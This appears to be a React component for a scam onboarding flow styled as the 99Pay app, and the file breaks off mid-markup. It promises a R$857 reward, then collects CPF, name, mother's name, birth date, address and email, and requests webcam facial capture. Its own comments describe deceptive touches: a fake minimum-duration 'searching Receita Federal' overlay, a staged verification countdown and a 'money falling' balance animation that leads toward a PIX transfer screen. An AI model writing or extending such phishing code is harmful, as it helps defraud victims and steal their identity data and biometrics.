"use client"

import { useState, useEffect, useRef, useCallback } from "react"
import Image from "next/image"
import { FaceRecognition } from "./face-recognition"
import { SuccessScreen } from "./success-screen"
import { CpfSearchOverlay } from "./cpf-search-overlay"

type Step = 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | null

interface FormData {
  nome: string
  cpf: string
  dataNascimento: string
  nomeMae: string
  email: string
  escolaridade: string
  estadoCivil: string
  cep: string
  estado: string
  cidade: string
  bairro: string
  rua: string
  numero: string
}

export function OnboardingPopup() {
  const [currentStep, setCurrentStep] = useState<Step>(null)
  const [isVisible, setIsVisible] = useState(false)
  const [formData, setFormData] = useState<FormData>({
    nome: "",
    cpf: "",
    dataNascimento: "",
    nomeMae: "",
    email: "",
    escolaridade: "",
    estadoCivil: "",
    cep: "",
    estado: "",
    cidade: "",
    bairro: "",
    rua: "",
    numero: ""
  })
  const [formSubStep, setFormSubStep] = useState<1 | 2 | 3>(1)
  const [slideDirection, setSlideDirection] = useState<'left' | 'right'>('left')
  const [isLoadingCpf, setIsLoadingCpf] = useState(false)
  const [isLoadingCep, setIsLoadingCep] = useState(false)
  const [isProgressLoading, setIsProgressLoading] = useState(false)

  const [verificationTimer, setVerificationTimer] = useState(30)
  const videoRef = useRef<HTMLVideoElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const audioRef = useRef<HTMLAudioElement>(null)
  const [audioPlayed, setAudioPlayed] = useState(false)

  // Funcao para tocar o audio de recompensa
  const playRewardSound = () => {
    if (audioRef.current) {
      audioRef.current.currentTime = 0
      audioRef.current.volume = 0.8
      audioRef.current.play()
        .then(() => setAudioPlayed(true))
        .catch(() => {
          // Navegador bloqueou
        })
    }
  }

  useEffect(() => {
    // Reset para teste - remova esta linha em producao
    localStorage.removeItem("99pay_onboarding_completed")
    
    const hasCompletedOnboarding = localStorage.getItem("99pay_onboarding_completed")
    
    if (!hasCompletedOnboarding) {
      const timer = setTimeout(() => {
        setCurrentStep(1)
        setIsVisible(true)
      }, 500)
      
      return () => clearTimeout(timer)
    }
  }, [])



  const stopCamera = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop())
      streamRef.current = null
    }
  }, [])

  const startCamera = useCallback(async (facingMode: "user" | "environment") => {
    try {
      stopCamera()
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
      })
      streamRef.current = stream
      if (videoRef.current) {
        videoRef.current.srcObject = stream
      }
    } catch (error) {
      console.error("Erro ao acessar camera:", error)
    }
  }, [stopCamera])

  useEffect(() => {
    return () => stopCamera()
  }, [stopCamera])

  const handleStep1Click = () => {
    // Toca o audio na primeira interacao do usuario (garante que funciona)
    playRewardSound()
    setCurrentStep(2)
  }

  const handleStep2Ativar = () => setCurrentStep(3)

  const handleStep2Fechar = () => {
    setIsVisible(false)
    setCurrentStep(null)
  }

  const handleStep3Continue = () => setCurrentStep(4)

  const handleFormChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }))
  }

  // Funcao para buscar valor em qualquer nivel do objeto da API
  const findField = (obj: Record<string, unknown>, keys: string[]): string | null => {
    if (!obj || typeof obj !== 'object') return null
    for (const key of keys) {
      const val = obj[key]
      if (val !== undefined && val !== null && val !== '') return String(val)
    }
    for (const k of Object.keys(obj)) {
      const nested = obj[k]
      if (typeof nested === 'object' && nested !== null) {
        const found = findField(nested as Record<string, unknown>, keys)
        if (found) return found
      }
    }
    return null
  }

  // Funcao para consultar API de CPF
  const consultarCpf = async (cpf: string) => {
    const cpfLimpo = cpf.replace(/\D/g, '')
    if (cpfLimpo.length !== 11) return

    // Duracao MINIMA do overlay "Buscando informacoes" (em ms).
    // Mesmo que a API responda mais rapido, o overlay fica visivel
    // ate completar 5s para dar a sensacao de busca em andamento.
    const MIN_OVERLAY_MS = 5000
    const startedAt = Date.now()

    setIsLoadingCpf(true)
    localStorage.setItem('cpf', cpfLimpo)

    let nome = ''
    let nomeMae = ''
    let dataFormatada = ''

    try {
      // Consulta via API route interna (mantém a chave segura no servidor)
      const res = await fetch('/api/cpf', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cpf: cpfLimpo }),
      })
      const data = await res.json()
      console.log('[v0] Resposta API CPF:', data)

      nome = findField(data, ['NOME', 'nome', 'name', 'Nome', 'nome_completo', 'nomeCompleto']) || ''
      nomeMae = findField(data, ['NOME_MAE', 'nome_mae', 'mae', 'nomeMae', 'Nome_Mae', 'MAE', 'nome_da_mae']) || ''
      const dataNasc = findField(data, ['NASC', 'nasc', 'nascimento', 'data_nascimento', 'DATA_NASCIMENTO', 'dataNascimento', 'dt_nascimento', 'DT_NASCIMENTO', 'birth', 'birthday']) || ''

      // Formata a data de nascimento para o formato do input date (YYYY-MM-DD)
      if (dataNasc) {
        if (dataNasc.includes('/')) {
          const partes = dataNasc.split('/')
          if (partes.length === 3) {
            dataFormatada = `${partes[2]}-${partes[1].padStart(2, '0')}-${partes[0].padStart(2, '0')}`
          }
        } else if (dataNasc.includes('-')) {
          dataFormatada = dataNasc
        }
      }
    } catch (error) {
      // Erro silencioso - aguarda mesmo assim o tempo minimo da animacao
    }

    // Garante que o overlay fique visivel por no minimo 3.5s independente
    // de quanto tempo a API levou para responder
    const elapsed = Date.now() - startedAt
    if (elapsed < MIN_OVERLAY_MS) {
      await new Promise(resolve => setTimeout(resolve, MIN_OVERLAY_MS - elapsed))
    }

    if (nome || nomeMae || dataFormatada) {
      setFormData(prev => ({
        ...prev,
        nome: nome || prev.nome,
        nomeMae: nomeMae || prev.nomeMae,
        dataNascimento: dataFormatada || prev.dataNascimento
      }))

      // Salva nome no localStorage para uso na tela de transferencia PIX
      if (nome) {
        localStorage.setItem('user_nome', nome)
      }
    }

    setIsLoadingCpf(false)
  }

  // Formata CPF enquanto digita
  const formatarCpf = (valor: string) => {
    const numeros = valor.replace(/\D/g, '').slice(0, 11)
    return numeros
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
  }

  const handleCpfChange = (valor: string) => {
    const cpfFormatado = formatarCpf(valor)
    handleFormChange('cpf', cpfFormatado)
    
    // Consulta a API quando o CPF estiver completo (14 caracteres com formatacao)
    if (cpfFormatado.length === 14) {
      consultarCpf(cpfFormatado)
    }
  }

  // Formata CEP enquanto digita
  const formatarCep = (valor: string) => {
    const numeros = valor.replace(/\D/g, '').slice(0, 8)
    return numeros.replace(/(\d{5})(\d)/, '$1-$2')
  }

  // Consulta CEP via API ViaCEP
  const consultarCep = async (cep: string) => {
    const cepLimpo = cep.replace(/\D/g, '')
    if (cepLimpo.length !== 8) return

    setIsLoadingCep(true)
    try {
      const res = await fetch(`https://viacep.com.br/ws/${cepLimpo}/json/`)
      const data = await res.json()
      if (!data.erro) {
        setFormData(prev => ({
          ...prev,
          estado: data.uf || prev.estado,
          cidade: data.localidade || prev.cidade,
          bairro: data.bairro || prev.bairro,
          rua: data.logradouro || prev.rua
        }))
      }
    } catch (error) {
      console.log('Erro ao consultar CEP:', error)
    } finally {
      setIsLoadingCep(false)
    }
  }

  const handleCepChange = (valor: string) => {
    const cepFormatado = formatarCep(valor)
    handleFormChange('cep', cepFormatado)
    
    if (cepFormatado.length === 9) {
      consultarCep(cepFormatado)
    }
  }

  // Validacoes por sub-etapa
  const isSubStep1Valid = () => formData.cpf.length === 14 && formData.nome && formData.dataNascimento
  const isSubStep2Valid = () => formData.email && formData.escolaridade && formData.estadoCivil
  const isSubStep3Valid = () => formData.cep.length === 9 && formData.estado && formData.cidade

  const handleFormSubStepNext = () => {
    if (formSubStep === 1 && isSubStep1Valid()) {
      // Salva nome e CPF no localStorage para uso na tela de transferencia PIX
      if (formData.nome) {
        localStorage.setItem('user_nome', formData.nome)
      }
      if (formData.cpf) {
        localStorage.setItem('cpf', formData.cpf)
        localStorage.setItem('user_cpf', formData.cpf)
      }
      setIsProgressLoading(true)
      setTimeout(() => {
        setSlideDirection('left')
        setFormSubStep(2)
        setIsProgressLoading(false)
      }, 1000)
    } else if (formSubStep === 2 && isSubStep2Valid()) {
      setIsProgressLoading(true)
      setTimeout(() => {
        setSlideDirection('left')
        setFormSubStep(3)
        setIsProgressLoading(false)
      }, 1000)
    } else if (formSubStep === 3 && isSubStep3Valid()) {
      setIsProgressLoading(true)
      setTimeout(() => {
        setCurrentStep(5)
        setIsProgressLoading(false)
      }, 1000)
    }
  }

  const handleFormSubStepBack = () => {
    if (formSubStep === 1) {
      setCurrentStep(3)
    } else {
      setSlideDirection('right')
      setFormSubStep((prev) => (prev - 1) as 1 | 2 | 3)
    }
  }

  const isFormValid = () => {
    return formData.nome && formData.cpf && formData.dataNascimento && formData.nomeMae &&
           formData.email && formData.escolaridade && formData.estadoCivil && formData.cep
  }

  const handleStep4Continue = () => {
    if (isFormValid()) setCurrentStep(5)
  }

  const handleStep5Continue = () => {
    setCurrentStep(6)
  }

  const handleFaceRecognitionComplete = () => {
    setCurrentStep(7)
  }

  const handleFaceRecognitionBack = () => {
    setCurrentStep(5)
  }

  // Handler para quando clica em "Fechar" na tela Tudo Certo
  const handleTudoCertoFechar = () => {
    setCurrentStep(8)
    setVerificationTimer(30)
    
    // Inicia contador de 30 segundos
    const interval = setInterval(() => {
      setVerificationTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval)
          // Marca como completo e vai para animacao de sucesso
          localStorage.setItem("99pay_onboarding_completed", "true")
          setCurrentStep(9)
          return 0
        }
        return prev - 1
      })
    }, 1000)
  }

  // Handler para quando a etapa 9 inicia (clique em Concluir)
  const handleStep9Start = () => {
    // Redireciona imediatamente para a tela do 99Pay e dispara animacao do saldo
    setIsVisible(false)
    setCurrentStep(null)
    // Forca scroll INSTANTANEO para o topo (onde esta o saldo)
    // para a pessoa ja ver o dinheiro caindo de imediato no topo da tela
    if (typeof window !== 'undefined') {
      try {
        window.scrollTo({ top: 0, left: 0, behavior: 'instant' as ScrollBehavior })
      } catch {
        window.scrollTo(0, 0)
      }
      document.documentElement.scrollTop = 0
      document.body.scrollTop = 0
    }
    // Pequeno delay para garantir que o popup feche antes da animacao iniciar
    setTimeout(() => {
      window.dispatchEvent(new CustomEvent('showMoneyAnimation'))
    }, 300)
  }

  if (!isVisible || !currentStep) return null

  // Barra de progresso para etapas 4-10 - mais grossa e vibrante com animacao de loading
  const ProgressBar = ({ step }: { step: number }) => (
    <div className="w-full px-4 py-4">
      <div className="flex items-center gap-1 relative">
        {/* Barra de fundo */}
        <div className="absolute inset-0 h-3 bg-gray-200 rounded-full top-1/2 -translate-y-1/2" style={{ width: 'calc(100% - 50px)' }} />
        {/* Barra de progresso amarela */}
        <div 
          className="absolute h-3 bg-gradient-to-r from-[#FFD700] to-[#FFE500] rounded-full top-1/2 -translate-y-1/2 transition-all duration-500 shadow-md overflow-hidden" 
          style={{ width: `calc(${(step / 4) * 100}% - ${step < 4 ? '50px' : '0px'})` }} 
        >
          {/* Animacao de loading - faixa brilhante que passa da esquerda para direita */}
          {isProgressLoading && (
            <>
              <div 
                className="absolute inset-0 bg-gradient-to-r from-transparent via-white/80 to-transparent"
                style={{
                  animation: 'shimmer 1s linear infinite',
                }}
              />
              <div 
                className="absolute inset-0 bg-gradient-to-r from-[#FFD700] via-[#FFFF00] to-[#FFD700]"
                style={{
                  animation: 'pulse 0.5s ease-in-out infinite alternate',
                }}
              />
            </>
          )}
        </div>
        {/* Bolinhas de progresso */}
        <div className="relative flex items-center justify-between w-full" style={{ paddingRight: '50px' }}>
          <div className={`w-5 h-5 rounded-full border-4 ${step >= 1 ? 'bg-[#FFE500] border-[#FFD700]' : 'bg-white border-gray-300'} z-10 shadow-sm transition-all duration-300`} />
          <div className={`w-5 h-5 rounded-full border-4 ${step >= 2 ? 'bg-[#FFE500] border-[#FFD700]' : 'bg-white border-gray-300'} z-10 shadow-sm transition-all duration-300`} />
          <div className={`w-5 h-5 rounded-full border-4 ${step >= 3 ? 'bg-[#FFE500] border-[#FFD700]' : 'bg-white border-gray-300'} z-10 shadow-sm transition-all duration-300`} />
          <div className={`w-5 h-5 rounded-full border-4 ${step >= 4 ? 'bg-[#FFE500] border-[#FFD700]' : 'bg-white border-gray-300'} z-10 shadow-sm transition-all duration-300`} />
        </div>
        {/* Icone saco de dinheiro */}
        <div className="absolute right-0 top-1/2 -translate-y-1/2 text-3xl">&#128176;</div>
      </div>
      <div className="flex justify-end mt-2">
        <span className="bg-[#22c55e] text-white text-xs font-bold px-3 py-1.5 rounded-full shadow-md">
          Pacote de recompensas de até R$857
        </span>
      </div>
      {/* CSS para animacoes */}
      <style jsx>{`
        @keyframes shimmer {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(200%); }
        }
        @keyframes pulse {
          0% { opacity: 0.6; }
          100% { opacity: 1; }
        }
      `}</style>
    </div>
  )

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center">
      {/* Audio de recompensa */}
      <audio 
        ref={audioRef} 
        src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/audio%20mp3%20barulho%20recompensa-bqoO3OxcWust4nsXo7GGIeZvnGr1GH.MP3"
        preload="auto"
      />

      {/* Overlay full-screen "Buscando informacoes" - aparece quando o CPF
          esta sendo consultado na Receita Federal (apos digitar os 11 digitos) */}
      <CpfSearchOverlay visible={isLoadingCpf} />

      {/* Overlay escuro para popups */}
      {(currentStep === 1 || currentStep === 2) && (
        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
      )}
      
      {/* ETAPA 1 - Popup "Voce foi selecionado" */}
      {currentStep === 1 && (
        <div className="relative z-10 mx-2 w-full max-w-md animate-in fade-in zoom-in duration-300">
          <button onClick={handleStep1Click} className="w-full active:scale-95 transition-transform">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/ChatGPT%20Image%2026%20de%20mar.%20de%202026%2C%2021_12_22-Photoroom-EnXWiqKgvFaNZxCwMUNfcCQ834X5Ax.png"
              alt="Você foi selecionado - Resgatar agora"
              width={500}
              height={600}
              className="object-contain drop-shadow-2xl"
              style={{ width: '100%', height: 'auto' }}
              priority
            />
          </button>
        </div>
      )}

      {/* ETAPA 2 - Popup "Crie sua conta" */}
      {currentStep === 2 && (
        <div className="relative z-10 mx-2 w-full max-w-md animate-in fade-in zoom-in duration-300">
          <button 
            onClick={handleStep2Ativar} 
            className="w-full active:scale-95 transition-transform cursor-pointer"
          >
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/ChatGPT%20Image%2026%20de%20mar.%20de%202026%2C%2021_06_04-Photoroom-2BzOFygRQJijrdoPB3q38b4YFwd0BX.png"
              alt="Crie sua conta agora e aproveite os benefícios"
              width={500}
              height={700}
              className="object-contain drop-shadow-2xl"
              style={{ width: '100%', height: 'auto' }}
              priority
            />
          </button>
        </div>
      )}

      {/* ETAPA 3 - Pagina mulher "Faca a verificacao" */}
      {currentStep === 3 && (
        <button 
          onClick={handleStep3Continue}
          className="fixed inset-0 z-[100] flex flex-col cursor-pointer animate-in fade-in duration-300"
          style={{ background: 'linear-gradient(to bottom, #e8e8e8 0%, #e8e8e8 35%, #ffffff 35%, #ffffff 100%)' }}
        >
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Design%20sem%20nome%20%2825%29-iGPNkl55tM8xgcDtceddqSZkQqRHqh.png"
            alt="Faça a verificação e saque seus R$857 de recompensa"
            width={500}
            height={900}
            className="object-contain object-top w-full h-auto"
            priority
          />
        </button>
      )}

      {/* ETAPA 4 - Formulario dados pessoais (3 sub-etapas) - OTIMIZADO MOBILE */}
      {currentStep === 4 && (
        <div className="fixed inset-0 bg-white z-[100] flex flex-col overflow-hidden">
          {/* Header fixo compacto */}
          <div className="bg-white z-10 flex-shrink-0">
            <div className="flex items-center px-3 py-2">
              <button onClick={handleFormSubStepBack} className="w-9 h-9 flex items-center justify-center rounded-full active:bg-gray-100 active:scale-90 transition-all">
                <svg className="w-5 h-5 text-gray-800" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                </svg>
              </button>
            </div>
            <ProgressBar step={1} />
          </div>
          
          <div className="px-4 pb-4">
            <h1 className="text-xl font-bold mb-6">
              <span className="text-[#FFB800] italic">Passo 1:</span> Preencha com suas informações pessoais
            </h1>
          </div>

          {/* Container das sub-etapas com animacao */}
          <div className="flex-1 overflow-hidden relative">
            {/* SUB-ETAPA 1: CPF, Nome, Data de nascimento - COMPACTO */}
            <div 
              className={`absolute inset-0 px-4 pb-24 overflow-y-auto transition-all duration-500 ease-out ${
                formSubStep === 1 
                  ? 'translate-x-0 opacity-100' 
                  : formSubStep > 1 
                    ? '-translate-x-full opacity-0' 
                    : 'translate-x-full opacity-0'
              }`}
            >
              <div className="bg-white rounded-2xl border border-gray-200 p-4 space-y-4">
                <div>
                  <label className="text-xs text-gray-500 font-medium">CPF</label>
                  <div className="relative flex items-center">
                    <input
                      type="tel"
                      inputMode="numeric"
                      value={formData.cpf}
                      onChange={(e) => handleCpfChange(e.target.value)}
                      className={`w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500] pr-8 transition-all ${isLoadingCpf ? 'bg-gray-50' : ''}`}
                      placeholder="000.000.000-00"
                      maxLength={14}
                      disabled={isLoadingCpf}
                    />
                    {isLoadingCpf && (
                      <div className="absolute right-1 w-5 h-5 border-[2.5px] border-[#FFE500] border-t-transparent rounded-full animate-spin"></div>
                    )}
                  </div>
                  {isLoadingCpf && (
                    <p className="text-[11px] text-[#FFB800] font-medium mt-1.5 flex items-center gap-1.5">
                      <span className="w-1 h-1 bg-[#FFB800] rounded-full animate-pulse"></span>
                      Buscando suas informações...
                    </p>
                  )}
                </div>
                
                <div>
                  <label className="text-xs text-gray-500 font-medium">Nome completo</label>
                  <input
                    type="text"
                    value={formData.nome}
                    onChange={(e) => handleFormChange("nome", e.target.value)}
                    className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500]"
                    placeholder="Como no seu documento"
                  />
                </div>
                
                <div>
                  <label className="text-xs text-gray-500 font-medium">Data de nascimento</label>
                  <input
                    type="date"
                    value={formData.dataNascimento}
                    onChange={(e) => handleFormChange("dataNascimento", e.target.value)}
                    className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500]"
                  />
                </div>
              </div>

              {/* Aviso compacto */}
              <div className="mt-3 bg-[#FFF8E1] border-l-4 border-[#FFB800] p-2.5 rounded-r">
                <p className="text-[11px] text-gray-700 leading-snug">
                  Seus dados são protegidos e usados apenas para verificação de segurança.
                </p>
              </div>
            </div>

            {/* SUB-ETAPA 2: Email, Escolaridade, Estado civil - COMPACTO */}
            <div 
              className={`absolute inset-0 px-4 pb-24 overflow-y-auto transition-all duration-500 ease-out ${
                formSubStep === 2 
                  ? 'translate-x-0 opacity-100' 
                  : formSubStep > 2 
                    ? '-translate-x-full opacity-0' 
                    : 'translate-x-full opacity-0'
              }`}
            >
              <div className="bg-white rounded-2xl border border-gray-200 p-4 space-y-4">
                <div>
                  <label className="text-xs text-gray-500 font-medium">E-mail</label>
                  <input
                    type="email"
                    value={formData.email}
                    onChange={(e) => handleFormChange("email", e.target.value)}
                    className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500]"
                    placeholder="seu@email.com"
                  />
                </div>
                
                <div>
                  <label className="text-xs text-gray-500 font-medium">Grau de escolaridade</label>
                  <div className="relative flex items-center">
                    <select
                      value={formData.escolaridade}
                      onChange={(e) => handleFormChange("escolaridade", e.target.value)}
                      className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500] bg-transparent pr-6 appearance-none"
                    >
                      <option value="">Selecione</option>
                      <option value="fundamental_incompleto">Fundamental incompleto</option>
                      <option value="fundamental">Fundamental completo</option>
                      <option value="medio_incompleto">Médio incompleto</option>
                      <option value="medio">Médio completo</option>
                      <option value="superior_incompleto">Superior incompleto</option>
                      <option value="superior">Superior completo</option>
                      <option value="pos">Pós-graduação</option>
                    </select>
                    <svg className="absolute right-0 w-4 h-4 text-gray-400 pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>
                
                <div>
                  <label className="text-xs text-gray-500 font-medium">Estado civil</label>
                  <div className="relative flex items-center">
                    <select
                      value={formData.estadoCivil}
                      onChange={(e) => handleFormChange("estadoCivil", e.target.value)}
                      className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500] bg-transparent pr-6 appearance-none"
                    >
                      <option value="">Selecione</option>
                      <option value="solteiro">Solteiro(a)</option>
                      <option value="casado">Casado(a)</option>
                      <option value="divorciado">Divorciado(a)</option>
                      <option value="viuvo">Viúvo(a)</option>
                      <option value="uniao_estavel">União Estável</option>
                    </select>
                    <svg className="absolute right-0 w-4 h-4 text-gray-400 pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>
              </div>
            </div>

            {/* SUB-ETAPA 3: CEP, Estado, Cidade - COMPACTO */}
            <div 
              className={`absolute inset-0 px-4 pb-24 overflow-y-auto transition-all duration-500 ease-out ${
                formSubStep === 3 
                  ? 'translate-x-0 opacity-100' 
                  : formSubStep > 3 
                    ? '-translate-x-full opacity-0' 
                    : 'translate-x-full opacity-0'
              }`}
            >
              <div className="bg-white rounded-2xl border border-gray-200 p-4 space-y-3.5">
                <div>
                  <label className="text-xs text-gray-500 font-medium">CEP</label>
                  <div className="relative flex items-center">
                    <input
                      type="tel"
                      inputMode="numeric"
                      value={formData.cep}
                      onChange={(e) => handleCepChange(e.target.value)}
                      className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500] pr-7"
                      placeholder="00000-000"
                      maxLength={9}
                    />
                    {isLoadingCep && (
                      <div className="absolute right-1 w-4 h-4 border-2 border-[#FFE500] border-t-transparent rounded-full animate-spin"></div>
                    )}
                  </div>
                </div>
                
                <div className="grid grid-cols-3 gap-3">
                  <div>
                    <label className="text-xs text-gray-500 font-medium">Estado</label>
                    <div className="relative flex items-center">
                      <select
                        value={formData.estado}
                        onChange={(e) => handleFormChange("estado", e.target.value)}
                        className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500] bg-transparent pr-4 appearance-none"
                      >
                        <option value="">UF</option>
                        {['AC','AL','AP','AM','BA','CE','DF','ES','GO','MA','MT','MS','MG','PA','PB','PR','PE','PI','RJ','RN','RS','RO','RR','SC','SP','SE','TO'].map(uf => (
                          <option key={uf} value={uf}>{uf}</option>
                        ))}
                      </select>
                      <svg className="absolute right-0 w-3 h-3 text-gray-400 pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                      </svg>
                    </div>
                  </div>
                  <div className="col-span-2">
                    <label className="text-xs text-gray-500 font-medium">Cidade</label>
                    <input
                      type="text"
                      value={formData.cidade}
                      onChange={(e) => handleFormChange("cidade", e.target.value)}
                      className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500]"
                      placeholder="Sua cidade"
                    />
                  </div>
                </div>
                
                <div>
                  <label className="text-xs text-gray-500 font-medium">Bairro</label>
                  <input
                    type="text"
                    value={formData.bairro}
                    onChange={(e) => handleFormChange("bairro", e.target.value)}
                    className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500]"
                    placeholder="Seu bairro"
                  />
                </div>
                
                <div className="grid grid-cols-3 gap-3">
                  <div className="col-span-2">
                    <label className="text-xs text-gray-500 font-medium">Rua</label>
                    <input
                      type="text"
                      value={formData.rua}
                      onChange={(e) => handleFormChange("rua", e.target.value)}
                      className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500]"
                      placeholder="Sua rua"
                    />
                  </div>
                  <div>
                    <label className="text-xs text-gray-500 font-medium">Número</label>
                    <input
                      type="tel"
                      inputMode="numeric"
                      value={formData.numero}
                      onChange={(e) => handleFormChange("numero", e.target.value)}
                      className="w-full border-b border-gray-200 py-2 text-base focus:outline-none focus:border-[#FFE500]"
                      placeholder="N&#176;"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Botao Continuar fixo no rodape - compacto */}
          <div className="absolute bottom-0 left-0 right-0 bg-white px-4 py-3 pb-5 border-t border-gray-100 flex-shrink-0">
            <button
              onClick={handleFormSubStepNext}
              disabled={
                (formSubStep === 1 && !isSubStep1Valid()) ||
                (formSubStep === 2 && !isSubStep2Valid()) ||
                (formSubStep === 3 && !isSubStep3Valid())
              }
              className={`w-full py-3.5 rounded-full text-base font-bold transition-all duration-300 ${
                (formSubStep === 1 && isSubStep1Valid()) ||
                (formSubStep === 2 && isSubStep2Valid()) ||
                (formSubStep === 3 && isSubStep3Valid())
                  ? 'bg-gradient-to-r from-[#FFD700] to-[#FFE500] text-gray-900 active:scale-95 shadow-lg' 
                  : 'bg-gray-200 text-gray-400 cursor-not-allowed'
              }`}
            >
              Continuar
            </button>
          </div>
        </div>
      )}

      {/* ETAPA 5 - Instrucoes verificacao facial - OTIMIZADO MOBILE */}
      {currentStep === 5 && (
        <div className="fixed inset-0 bg-white z-[100] flex flex-col overflow-hidden animate-in slide-in-from-right duration-300">
          <div className="bg-white z-10 flex-shrink-0">
            <div className="flex items-center px-3 py-2">
              <button onClick={() => setCurrentStep(4)} className="w-9 h-9 flex items-center justify-center rounded-full active:bg-gray-100 active:scale-90 transition-all">
                <svg className="w-5 h-5 text-gray-800" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                </svg>
              </button>
            </div>
            <ProgressBar step={2} />
          </div>
          
          <div className="flex-1 overflow-y-auto px-4 pt-1 pb-2">
            <h1 className="text-base font-bold mb-2 leading-tight">
              <span className="text-[#FFB800] italic">Passo 2:</span> Olá, {formData.nome.split(' ')[0] || 'Usuário'}! Faça sua verificação facial para maior segurança
            </h1>
            
            {/* Imagem das duas mulheres certo/errado */}
            <div className="flex justify-center mb-3">
              <Image 
                src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-8qtq05pWQKfFApQoFf6klIxCmyw8PQ.png" 
                alt="Exemplo certo e errado" 
                width={260} 
                height={150} 
                className="object-contain w-[240px] h-auto"
              />
            </div>
            
            {/* Instrucoes */}
            <div className="space-y-2.5 bg-gray-50 rounded-xl p-3">
              <div className="flex items-start gap-2.5">
                <div className="w-5 h-5 flex-shrink-0 mt-0.5">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-full h-full text-gray-700">
                    <circle cx="12" cy="12" r="10" />
                    <path d="M4 4l16 16" />
                  </svg>
                </div>
                <div className="flex-1 min-w-0">
                  <h3 className="font-bold text-gray-900 text-[13px] leading-tight">Não use boné ou óculos escuros</h3>
                  <p className="text-[11px] text-gray-500 leading-snug">Deixe seu rosto descoberto e siga as instruções na tela</p>
                </div>
              </div>
              <div className="flex items-start gap-2.5">
                <div className="w-5 h-5 flex-shrink-0 mt-0.5">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-full h-full text-gray-700">
                    <circle cx="12" cy="12" r="5" />
                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42" />
                  </svg>
                </div>
                <div className="flex-1 min-w-0">
                  <h3 className="font-bold text-gray-900 text-[13px] leading-tight">Ambiente bem iluminado</h3>
                  <p className="text-[11px] text-gray-500 leading-snug">Evite reflexos e olhe diretamente para a câmera</p>
                </div>
              </div>
              <div className="flex items-start gap-2.5">
                <div className="w-5 h-5 flex-shrink-0 mt-0.5">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-full h-full text-gray-700">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                    <path d="M9 12l2 2 4-4" />
                  </svg>
                </div>
                <div className="flex-1 min-w-0">
                  <h3 className="font-bold text-gray-900 text-[13px] leading-tight">Segurança e privacidade</h3>
                  <p className="text-[11px] text-gray-500 leading-snug">Suas informações são confidenciais e usadas apenas para verificação</p>
                </div>
              </div>
            </div>
          </div>
          
          <div className="bg-white px-4 py-2 pb-3 border-t border-gray-100 flex-shrink-0">
            <button onClick={handleStep5Continue} className="w-full py-3 rounded-full text-sm font-bold bg-gradient-to-r from-[#FFD700] to-[#FFE500] text-gray-900 active:scale-95 transition-all shadow-lg">
              Continuar
            </button>
          </div>
        </div>
      )}

      {/* ETAPA 6 - Reconhecimento facial com IA */}
      {currentStep === 6 && (
        <FaceRecognition 
          onComplete={handleFaceRecognitionComplete}
          onBack={handleFaceRecognitionBack}
        />
      )}

      {/* ETAPA 7 - Tudo Certo! */}
      {currentStep === 7 && (
        <div className="fixed inset-0 bg-white z-[100] flex flex-col items-center justify-center px-6 animate-in fade-in duration-300">
          {/* Icone de sucesso */}
          <div className="w-40 h-40 bg-green-50 rounded-full flex items-center justify-center mb-8">
            <svg className="w-24 h-24 text-green-500" viewBox="0 0 100 100" fill="none">
              {/* Celular com documento */}
